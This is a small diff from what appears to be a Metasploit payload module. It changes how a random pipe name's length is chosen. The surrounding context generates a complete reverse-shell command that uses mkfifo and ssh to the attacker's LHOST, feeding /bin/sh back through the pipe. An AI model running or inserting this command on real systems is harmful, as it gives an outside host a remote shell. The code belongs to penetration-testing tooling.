@@ -53,7 +53,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
+    backpipe = Rex::Text.rand_text_alpha_lower(4..8)
     lport = datastore['LPORT'] == 22 ? '' : "-p #{datastore['LPORT']} "
     opts =  datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map {|e| e = "-o #{e} " }.join
     "mkfifo /tmp/#{backpipe};ssh -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
